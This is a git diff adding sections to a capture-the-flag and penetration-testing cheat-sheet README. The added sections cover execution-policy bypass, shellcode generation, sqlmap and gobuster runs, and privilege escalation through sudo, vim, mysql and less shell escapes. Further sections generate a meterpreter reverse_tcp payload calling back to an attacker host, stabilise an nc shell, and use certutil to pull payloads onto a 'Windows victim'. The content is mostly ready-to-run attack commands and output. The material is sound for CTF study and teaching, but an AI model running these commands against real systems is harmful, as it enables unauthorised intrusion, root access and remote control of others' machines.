@@ -157,6 +157,12 @@ If RPC is open, we can login using rpclient.
 > $ rpcclient -U "" <HOST_IP>
 ```
 
+### Powershell
+To bypass execution policy
+```
+> $ powershell.exe -exec bypass
+```
+
 ## Web Hacking
 
 ### Five Stages of Web Hacking
@@ -238,6 +244,80 @@ To use bind shell, we have to follow two steps: 1, Create a Bind Shell 2,Listen 
 ```
 > $ nc -lvp <ATTACKER_PORT>
 ```
+
+### BufferOverflow
+To generate shellcode quickly, we can use python `pwn` library.
+* `python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh))`
+* `(python -c "import pwn;print(pwn.asm(pwn.shellcraft.linux.sh()))" ;cat) | ./vuln`
+
+### Gobuster with Cookie (Useful to directory traversal when cookie is needed )
+```
+> $ gobuster dir -u http://<IP_ADDRESS> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -c PHPSESSID=<COOKIE_VALUE>
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://<IP_ADDRESS>
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] Cookies:        <COOKIE_VALUE>
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/04/19 01:43:01 Starting gobuster
+===============================================================
+/home.php (Status: 302)
+/index.php (Status: 200)
+```
+
+### SQLMAP 
+Redirect the HTTP Request to Burpsuite and we can see the request like this.
+```
+POST / HTTP/1.1
+Host: 10.10.10.162
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://10.10.10.162/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 11
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+search=help
+```
+Now Right click and click on `copy to file` option.
+```
+> $ sqlmap -r search.req --batch --force-ssl
+        ___
+       __H__
+ ___ ___[,]_____ ___ ___  {1.4.3#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 01:25:16 /2020-04-19/
+
+[01:25:16] [INFO] parsing HTTP request from 'search.req'
+[01:25:17] [INFO] testing connection to the target URL
+[01:25:17] [INFO] checking if the target is protected by some kind of WAF/IPS
+[01:25:17] [INFO] testing if the target URL content is stable
+[01:25:18] [INFO] target URL content is stable
+[01:25:18] [INFO] testing if POST parameter 'search' is dynamic
+[01:25:18] [WARNING] POST parameter 'search' does not appear to be dynamic
+[01:25:18] [WARNING] heuristic (basic) test shows that POST parameter 'search' might not be injectable
+[01:25:19] [INFO] testing for SQL injection on POST parameter 'search'
+[01:25:19] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[01:25:20] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[01:25:21] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[01:25:22] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+```
+
 
 ## File Hacking
 
@@ -342,6 +422,21 @@ To extract ntfs file system on Linux.
 > $ sudo mount -o loop <FILENAME.ntfs> mnt
 ```
 
+### Recover Files from Deleted File Systems
+
+To Recover Files from Deleted File Systems from Remote Hosts.
+```
+> $ ssh username@remote_address "sudo dcfldd -if=/dev/sdb | gzip -1 ." | dcfldd of=extract.dd.gz
+> $ gunzip -d extract.dd.gz
+> $ binwalk -Me extract.dd
+```
+
+### Packet Capture
+If usb keys are mapped with pcap, we can use this Article to extract usb keys entered: [Link](https://medium.com/@ali.bawazeeer/kaizen-ctf-2018-reverse-engineer-usb-keystrok-from-pcap-file-2412351679f4)
+```
+> $ tskark.exe -r <FILE_NAME.pcapng> -Y "usb.transfer_types==1" -e "frame.time.epoch" -e "usb.capdata" -Tfields
+```
+
 ### JavaScript Deobfuscator
 
 To Deobfuscate JavaScript, use [Jsnice](http://www.jsnice.org/).
@@ -394,6 +489,166 @@ To crack the password, we can use `hashcat` here 500 is for format `$1$` Replace
 > $ hashcat -m 500 -a 0 -o cracked.txt hashes.txt /usr/share/wordlists/rockyou.txt --force
 ```
 
+## Privilige Escalation
+
+### Standard Scripts for Enumeration
+* [Linux Priv Checker](https://github.com/sleventyeleven/linuxprivchecker)
+* [Lin Enum Script](https://github.com/rebootuser/LinEnum)
+* [Unix Priv Check](https://github.com/pentestmonkey/unix-privesc-check)
+* [Pspy](https://github.com/DominicBreuker/pspy) for Getting information on cron, proceses.
+* [Gtfobins](https://gtfobins.github.io/) - If we dont exactly remember how to use a given setuid command to get Privliges.
+
+### Dirtycow 
+
+On older linux kernals, we can gain root access using dirtycow exploit.
+
+To Use DirtyCow : [Link](https://dirtycow.ninja/) - Maybe more specifically : [Dirty.c](https://github.com/FireFart/dirtycow/blob/master/dirty.c)
+
+### Sudo 
+
+To check what sudo command can the current user run with no-password.
+
+```
+> $ sudo -l
+```
+
+Examples:
+```
+> $ sudo -l
+User www-data may run the following commands on bashed:
+(enemy : enemy) NOPASSWD: ALL
+```
+We can try like below
+```
+> $ sudo -u enemy /bin/bash
+id
+uid=1001(enemy) gid=1001(enemy) groups=1001(enemy)
+```
+
+### Gain More Privilige on windows system
+* In meterpreter shell try `getsystem`
+* In meterpreter shell try `background` and then follow rest of commands.
+* search suggester
+* `use post/multi/recon/local_exploit_suggestor` (Example only)
+* `show options`
+* `set session 1`
+* `run`
+* If worked fine, else Try follow rest of commands.
+* Use this link: [FuzzySec Win Priv Exec](https://www.fuzzysecurity.com/tutorials/16.html)
+* Use this method: [Sherlock](https://github.com/rasta-mouse/Sherlock)
+* If current process doesnt own Privs, use `migrate <PID>` to get more Priviliges in Meterpretor.
+
+
+To get Shell on Windows use [Unicorn](https://github.com/trustedsec/unicorn.git)
+```
+> $ /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp <HOST_IP> 3333 
+[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...
+> $ msfconsole -r unicorn.rc 
+[*] Started reverse TCP handler on <HOST_IP>:3333 
+msf5 exploit(multi/handler) >         
+```
+
+### MYSQL with Sudo Privilage
+
+To get Shell from MYSQL
+```
+mysql> \! /bin/sh
+```
+
+### VIM Editor with Sudo Privilage
+
+To get Shell from VIM.
+
+Method-1:
+```
+> $ sudo /usr/bin/vi /var/www/html/../../../root/root.txt
+```
+Method-2:
+
+```
+> $ sudo /usr/bin/vi /var/www/html/anyrandomFile
+Type Escape and enter :!/bin/bash
+```
+
+### Cronjob
+
+If some system cron is getting some url present in the file, we can replace url to get flag as below.
+```
+> $ cat input 
+url = "file:///root/root.txt"
+```
+
+To monitor cronjobs, we can tail the syslogs.
+```
+> $ tail -f /var/log/syslog
+Nov 18 23:55:01 sun CRON[5327]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+Nov 19 00:00:01 sun CRON[5626]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+Nov 19 00:00:01 sun CRON[5627]: (sun) CMD (nodejs /home/sun/server.js >/dev/null 2>&1)
+Nov 19 00:05:01 sun CRON[5701]: (root) CMD (python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py)
+```
+
+
+### More or Less Command 
+
+* If any file we found in low priv user and it contains something like this, we can execute it and minimize the size of terminal to enter the visual mode and enter `!/bin/bash` to get root shell
+```
+> $ cat new.sh 
+#!/bin/bash
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+  
+> $ sh new.sh 
+-- Logs begin at Sun 2019-11-17 19:19:25 EST, end at Mon 2019-11-18 17:13:44 EST. --
+Nov 18 17:02:26 kali sudo[11538]: pam_unix(sudo:auth): authentication failure; logname= uid=33 eu
+Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): conversation failed
+Nov 18 17:02:29 kali sudo[11538]: pam_unix(sudo:auth): auth could not identify password for [www-
+Nov 18 17:02:29 kali sudo[11538]: www-data : command not allowed ; TTY=unknown ; PWD=/tmp ; USER=
+Nov 18 17:02:29 kali crontab[11595]: (www-data) LIST (www-data)
+!/bin/bash
+root # 
+```
+
+### Improve Shell
+To get the better Shell after taking control of the system.
+```
+www-data@machine:/var/www/html$ python3 -c "import pty;pty.spawn('/bin/bash')"
+<html$ python3 -c "import pty;pty.spawn('/bin/bash')"                        
+www-data@machine:/var/www/html$ ^Z
+[1]+  Stopped                 nc -nlvp 443
+root@kali:# stty raw -echo
+----------------------Here we need to type `fg` and press Enter `Twice`
+root@kali:# nc -nlvp 443 
+www-data@machine:/var/www/html$ export TERM=xterm
+```
+
+### Transfer Files from Host to Target Machine
+* Use `python -m SimpleHTTPServer` in the host folder.
+* Use Apache and put files in `/var/www/html/` folder.
+* If Tomcat is Opened, upload the file/payload using the Admin panel.
+* If wordpress is running, upload the file as plugin.
+* In Windows Victim, use `certutil -urlcache -f http://<HOST_IP>/<FILE_NAME> <OUTPUT_FILE_NAME>`
+
+
+
+## Tools
+
+### Reconnoitre
+Security tool for multithreaded information gathering and service enumeration whilst building directory structures to store results, along with writing out recommendations for further testing.
+* [Link](https://github.com/codingo/Reconnoitre)
+```
+> $ reconnoitre -t 10.10.10.37 -o `pwd` --services`
+```
+
+* Total Commander - multi purpose terminal for Hacking. Link : www.ghisler.com
+* CTF Exploitation Framework : GitHub.com/Gallopsled/pwntools `pip install pwntools`
+* When using GDB, we can create "~/.gdbinit" file and add this line "set disassembly-flavor intel" to make intel synatx.
+* Dirbuster for enumeration web server Attacks.
+* [Gobuster](https://github.com/OJ/gobuster) - Used for advanced enumeration.
+* [Nmap Automator](https://github.com/21y4d/nmapAutomator)
+* 7z Password Cracking: Use tool `7z2john`
+* SSH Password Cracking: `/usr/share/john/ssh2john.py id_rsa > output.hash`
+* [Quipqiup - Substitution Cipher Solver](https://quipqiup.com/)
+* [GDB Peda](https://github.com/longld/peda)
+* [Search Code - Based on Funcion name and code-snippet](https://searchcode.com/)
 
 ## How To Contribute
 Please follow the instructions in [CONTRIBUTING](contributing.md) file and beware of [CODE_OF_CONDUCT](code-of-conduct.md).
